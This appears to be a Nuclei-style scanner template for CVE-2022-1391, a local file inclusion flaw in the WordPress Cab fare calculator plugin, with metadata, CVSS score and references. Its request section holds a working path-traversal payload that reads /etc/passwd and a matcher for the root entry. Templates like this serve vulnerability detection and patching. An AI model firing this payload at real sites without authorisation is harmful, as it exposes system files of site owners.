id: CVE-2022-1391
info:
  name: WordPress Cab fare calculator < 1.0.4 - Local File Inclusion
  author: Splint3r7
  severity: critical
  description: The WordPress Cab fare calculator plugin version 1.0.4 and earlier
    has a vulnerability that allows for Local File Inclusion via invalid controller
    parameter validation.
  reference:
  - https://www.exploit-db.com/exploits/50843
  - https://wordpress.org/plugins/cab-fare-calculator
  - https://wpscan.com/vulnerability/680121fe-6668-4c1a-a30d-e70dd9be5aac
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1391
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1391
    cwe-id: CWE-22
  tags: cve2022,wordpress,wp-plugin,lfi,wp,edb,wpscan,cve
  metadata:
    impact: The Local File Inclusion vulnerability in the Cab fare calculator WordPress
      plugin can allow an attacker to include arbitrary files on the server and potentially
      execute malicious code, thereby impacting the security and functionality of
      the affected website.
    recommendation: It is recommended to update Cab fare calculator WordPress plugin
      to version 1.0.4 or higher to address the Local File Inclusion vulnerability
      (CVE-2022-1391).
requests:
- method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
